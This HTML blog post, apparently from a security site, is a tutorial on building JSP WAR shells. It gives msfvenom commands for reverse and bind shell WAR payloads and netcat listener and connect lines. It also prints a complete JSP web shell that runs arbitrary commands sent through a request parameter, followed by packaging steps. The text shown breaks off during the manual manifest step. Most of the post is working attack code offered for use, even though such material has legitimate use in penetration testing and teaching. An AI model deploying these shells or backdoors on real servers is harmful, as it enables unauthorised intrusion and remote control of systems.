<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="JSP War Shell" /><meta property="og:locale" content="en" /><meta name="description" content="How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s)." /><meta property="og:description" content="How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s)." /><link rel="canonical" href="/posts/jsp-war-shell/" /><meta property="og:url" content="/posts/jsp-war-shell/" /><meta property="og:site_name" content="Node Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-25T19:09:48+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="JSP War Shell" /><meta name="twitter:site" content="@todo" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-18T13:42:02+10:00","datePublished":"2021-10-25T19:09:48+10:00","description":"How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s).","headline":"JSP War Shell","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/jsp-war-shell/"},"url":"/posts/jsp-war-shell/"}</script><title>JSP War Shell | Node Security</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Node Security"><meta name="application-name" content="Node Security"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/icon.webp" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">Node Security</a></h1><p class="site-subtitle fst-italic mb-0">Security & Programming Guides</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tools/" class="nav-link"> <i class="fa-fw fas fa-tools"></i> <span>TOOLS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/O1dMate" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/todo" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['o1dmate','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>JSP War Shell</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>JSP War Shell</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1635152988" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Oct 25, 2021 </time> </span> <span> Updated <time data-ts="1674013322" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 18, 2023 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/todo">Alexander Wells</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="869 words" > <em>4 min</em> read</span></div></div></div></header><div class="content"><p>How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s).</p><ol><li><a href="#jsp-war-shell-msfvenom">JSP War Shell MSFVenom</a><ul><li><a href="#jsp-war-reverse-shell">JSP War Reverse Shell</a><li><a href="#jsp-war-bind-shell">JSP War Bind Shell</a><li><a href="#dealing-with-errors">Dealing with Errors</a></ul><li><a href="#jsp-war-simple-browser-shell">JSP War Simple Browser Shell</a><ul><li><a href="#example-shell-running-on-windows">Example Shell Running on Windows</a><li><a href="#example-shell-running-on-linux">Example Shell Running on Linux</a><li><a href="#package-with-java">Package with Java</a><li><a href="#package-manually">Package Manually</a></ul></ol><h1 id="jsp-war-shell-msfvenom">JSP War Shell MSFVenom</h1><p>Using the <code class="language-plaintext highlighter-rouge">msfvenom</code> tool built into Kali, we can see what shells we have available:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@kali:~# msfvenom --list payloads | grep jsp
    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell
root@kali:~# 
</pre></table></code></div></div><p>We can check what settings need to be specified using:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msfvenom -p java/jsp_shell_bind_tcp --list-options
msfvenom -p java/jsp_shell_reverse_tcp --list-options
</pre></table></code></div></div><h2 id="jsp-war-reverse-shell"><span class="me-2">JSP War Reverse Shell</span><a href="#jsp-war-reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.123 LPORT=3155 -f war &gt; shell.war
</pre></table></code></div></div><p>A netcat listener can be setup to listen for the connection using:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc -nvlp 3155
</pre></table></code></div></div><h2 id="jsp-war-bind-shell"><span class="me-2">JSP War Bind Shell</span><a href="#jsp-war-bind-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p java/jsp_shell_bind_tcp RHOST=0.0.0.0 LPORT=3155 -f war &gt; bind.war
</pre></table></code></div></div><p>We can then use netcat to connect to the bind shell:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc -nv 192.168.0.123 3155
</pre></table></code></div></div><h2 id="dealing-with-errors"><span class="me-2">Dealing with Errors</span><a href="#dealing-with-errors" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The above two shells are designed to working with Windows and Linux servers. However, sometimes the following message can come up after trying to load the application:</p><p><a href="/assets/security/jsp/jsp-3.png" class="popup img-link shimmer"><img src="/assets/security/jsp/jsp-3.png" alt="" loading="lazy"></a></p><p>This can be resolved by unzipping the war file, removing the System call, and replacing the OS check with correct shell path:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>String ShellPath = new String("cmd.exe");
</pre></table></code></div></div><p><br /></p><h1 id="jsp-war-simple-browser-shell">JSP War Simple Browser Shell</h1><p>Apologies for the below code highlight, apparently the code highlighter doesn’t like JSP code.</p><div class="language-jsp highlighter-rouge"><div class="code-header"> <span data-label-text="Jsp"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
</pre><td class="rouge-code"><pre><span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"background: rgb(30,30,30);"</span><span class="nt">&gt;</span>

<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">action=</span><span class="s">"index.jsp"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;h4</span> <span class="na">style=</span><span class="s">"color: white;"</span><span class="nt">&gt;</span>Command Options<span class="nt">&lt;/h4&gt;</span>

   <span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">"osType"</span> <span class="na">name=</span><span class="s">"osType"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"win"</span><span class="nt">&gt;</span>Windows<span class="nt">&lt;/option&gt;</span>
      <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"linux"</span><span class="nt">&gt;</span>Linux<span class="nt">&lt;/option&gt;</span>
   <span class="nt">&lt;/select&gt;</span>

   <span class="nt">&lt;/br&gt;</span>
   <span class="nt">&lt;/br&gt;</span>

   <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"cmd"</span> <span class="na">name=</span><span class="s">"cmd"</span> <span class="na">type=</span><span class="s">text</span> <span class="na">autofocus</span> <span class="na">style=</span><span class="s">"width: 300px;"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">"Run Command"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%!</span>
   <span class="c1">// Not Perfect, but will be good enough for a majority of cases that will arise</span>
   <span class="kd">public</span> <span class="nc">String</span> <span class="nf">HtmlEncode</span><span class="o">(</span><span class="nc">String</span> <span class="n">inputVal</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">return</span> <span class="n">inputVal</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"&amp;"</span><span class="o">,</span> <span class="s">"&amp;amp;"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"&lt;"</span><span class="o">,</span> <span class="s">"&amp;lt;"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="err">"&gt;</span><span class="s">", "</span><span class="o">&amp;</span><span class="n">gt</span><span class="o">;</span><span class="s">").replaceAll("</span><span class="err">\'</span><span class="s">", "</span><span class="o">&amp;</span><span class="n">apos</span><span class="o">;</span><span class="s">").replaceAll("</span><span class="err">\</span><span class="s">""</span><span class="o">,</span> <span class="s">"&amp;quot;"</span><span class="o">);</span>
   <span class="o">}</span>

   <span class="kd">public</span> <span class="nc">String</span> <span class="nf">RunCommand</span><span class="o">(</span><span class="nc">String</span> <span class="n">commandToRun</span><span class="o">,</span> <span class="nc">String</span> <span class="n">osType</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">String</span> <span class="n">outputString</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
      <span class="nc">String</span> <span class="n">currentLine</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

      <span class="k">try</span> <span class="o">{</span>
         <span class="nc">ProcessBuilder</span> <span class="n">processBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ProcessBuilder</span><span class="o">();</span>

         <span class="k">if</span> <span class="o">(</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">processBuilder</span><span class="o">.</span><span class="na">command</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">,</span> <span class="s">"/c"</span><span class="o">,</span> <span class="n">commandToRun</span><span class="o">);</span>
         <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">processBuilder</span><span class="o">.</span><span class="na">command</span><span class="o">(</span><span class="s">"bash"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">commandToRun</span><span class="o">);</span>
         <span class="o">}</span>
         
         <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">processBuilder</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>

         <span class="nc">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>

         <span class="k">while</span><span class="o">((</span><span class="n">currentLine</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">outputString</span> <span class="o">+=</span> <span class="nc">HtmlEncode</span><span class="o">(</span><span class="n">currentLine</span><span class="o">)</span> <span class="o">+</span> <span class="err">"</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">";
         }
      } catch(IOException e) {
         outputString = "</span><span class="nl">ERROR:</span> <span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">" + e.getCause() + "</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">" + e.getMessage() + "</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;"</span><span class="o">;</span>
      <span class="o">}</span>
      

      <span class="k">return</span> <span class="n">outputString</span><span class="o">;</span>
   <span class="o">}</span>
<span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
   <span class="nc">String</span> <span class="n">osType</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"osType"</span><span class="o">);</span>
   <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
   <span class="nc">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>

   <span class="nc">String</span> <span class="n">htmlCmd</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
   <span class="nc">String</span> <span class="n">htmlOsType</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>

   <span class="k">if</span> <span class="o">(</span><span class="n">osType</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">(!</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"win"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"linux"</span><span class="o">)))</span> <span class="o">{</span>
      <span class="n">osType</span> <span class="o">=</span> <span class="s">"linux"</span><span class="o">;</span>
   <span class="o">}</span>

   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">String</span> <span class="n">line</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

      <span class="nc">String</span> <span class="n">testCommand</span> <span class="o">=</span> <span class="nc">RunCommand</span><span class="o">(</span><span class="s">""</span><span class="o">,</span> <span class="n">osType</span><span class="o">);</span>

      <span class="k">if</span> <span class="o">(</span><span class="n">testCommand</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"ERROR:"</span><span class="o">))</span> <span class="o">{</span>
         <span class="n">output</span> <span class="o">=</span> <span class="nc">RunCommand</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span> <span class="n">osType</span><span class="o">);</span>
      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
         <span class="k">if</span> <span class="o">(</span><span class="n">osType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"win"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">output</span> <span class="o">=</span> <span class="s">"&lt;b style=\"color: white;\"</span><span class="err">&gt;</span><span class="s">" + HtmlEncode(RunCommand("</span><span class="n">cd</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", "")) + HtmlEncode("</span><span class="err">&gt;</span> <span class="s">") + HtmlEncode(cmd) + "</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">b</span><span class="err">&gt;</span><span class="s">";
         } else {
            String username = HtmlEncode(RunCommand("</span><span class="n">whoami</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", ""));
            String hostname = HtmlEncode(RunCommand("</span><span class="n">hostname</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", ""));
            String workingDir = HtmlEncode(RunCommand("</span><span class="n">pwd</span><span class="s">", osType).trim().replaceAll("</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">r</span><span class="s">", "").replaceAll("</span><span class="err">\</span><span class="n">n</span><span class="s">", ""));

            String userAndHost = "</span><span class="o">&lt;</span><span class="n">b</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: rgb(136,223,51);\"</span><span class="err">&gt;</span><span class="s">" + username + "</span><span class="err">@</span><span class="s">" + hostname + "</span><span class="o">&lt;/</span><span class="n">b</span><span class="err">&gt;</span><span class="s">" + "</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: white;\"</span><span class="err">&gt;</span><span class="o">:&lt;/</span><span class="n">span</span><span class="err">&gt;</span><span class="s">";
            String dirPath = "</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: rgb(114,159,207);\"</span><span class="err">&gt;</span><span class="s">" + workingDir + "</span><span class="o">&lt;/</span><span class="n">span</span><span class="err">&gt;</span><span class="s">";

            output = userAndHost + dirPath + "</span><span class="o">&lt;</span><span class="n">span</span> <span class="n">style</span><span class="o">=</span><span class="err">\</span><span class="s">"color: white;\"</span><span class="err">&gt;#</span> <span class="s">" + HtmlEncode(cmd) + "</span><span class="o">&lt;/</span><span class="n">span</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;</span><span class="o">&lt;/</span><span class="n">br</span><span class="err">&gt;"</span><span class="o">;</span>
         <span class="o">}</span>

         <span class="n">output</span> <span class="o">+=</span> <span class="nc">RunCommand</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span> <span class="n">osType</span><span class="o">);</span>
      <span class="o">}</span>

      <span class="n">htmlCmd</span> <span class="o">=</span> <span class="nc">HtmlEncode</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
      <span class="n">htmlOsType</span> <span class="o">=</span> <span class="nc">HtmlEncode</span><span class="o">(</span><span class="n">osType</span><span class="o">);</span>
   <span class="o">}</span>
<span class="nt">%&gt;</span>
<span class="nt">&lt;pre</span> <span class="na">style=</span><span class="s">"color: white;"</span><span class="nt">&gt;&lt;%=</span><span class="n">output</span> <span class="nt">%&gt;&lt;/pre&gt;</span>

<span class="nt">&lt;script&gt;</span>
   <span class="kd">let</span> <span class="nx">cmdValue</span> <span class="o">=</span> <span class="dl">"</span><span class="nt">&lt;%=</span><span class="n">htmlCmd</span> <span class="nt">%&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;quot;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\"</span><span class="dl">"</span><span class="p">).</span><span class="nf">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;apos;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">'</span><span class="dl">"</span><span class="p">).</span><span class="nf">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;gt;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">).</span><span class="nx">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;lt;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&lt;</span><span class="dl">"</span><span class="p">).</span><span class="nf">replaceAll</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;amp;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">);</span>
   <span class="kd">let</span> <span class="nx">osTypeValue</span> <span class="o">=</span> <span class="dl">"</span><span class="nt">&lt;%=</span><span class="n">htmlOsType</span> <span class="nt">%&gt;</span><span class="dl">"</span><span class="p">;</span>
   
   <span class="k">if </span><span class="p">(</span><span class="nx">osTypeValue</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">win</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">osTypeValue</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">linux</span><span class="dl">'</span><span class="p">)</span> <span class="nx">osTypeValue</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">linux</span><span class="dl">'</span><span class="p">;</span>

   <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">cmd</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">cmdValue</span><span class="p">;</span>
   <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">osType</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">osTypeValue</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;/body&gt;</span>
</pre></table></code></div></div><h2 id="example-shell-running-on-windows"><span class="me-2">Example Shell Running on Windows</span><a href="#example-shell-running-on-windows" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="/assets/security/jsp/jsp-1.png" class="popup img-link shimmer"><img src="/assets/security/jsp/jsp-1.png" alt="" loading="lazy"></a></p><h2 id="example-shell-running-on-linux"><span class="me-2">Example Shell Running on Linux</span><a href="#example-shell-running-on-linux" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="/assets/security/jsp/jsp-2.png" class="popup img-link shimmer"><img src="/assets/security/jsp/jsp-2.png" alt="" loading="lazy"></a></p><h2 id="package-with-java"><span class="me-2">Package with Java</span><a href="#package-with-java" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With the above JSP code, we can bundle it into a war file using the <code class="language-plaintext highlighter-rouge">jar</code> tool that comes with Java JDK:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>jar -cvf OUTPUT_FILE INPUT_FILES
jar -cvf browser-shell.war index.jsp
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">index.jsp</code> can also be substituted with <code class="language-plaintext highlighter-rouge">*</code> to bundle all the files in the current folder.</ul><h2 id="package-manually"><span class="me-2">Package Manually</span><a href="#package-manually" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Alternatively, you can create a folder called <code class="language-plaintext highlighter-rouge">META-INF</code>, and inside that folder created a file called <code class="language-plaintext highlighter-rouge">MANIFEST.MF</code>. This file should contain the manifest version and Java version:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Manifest-Version: 1.0
Created-By: 17.0.1 (Oracle Corporation)
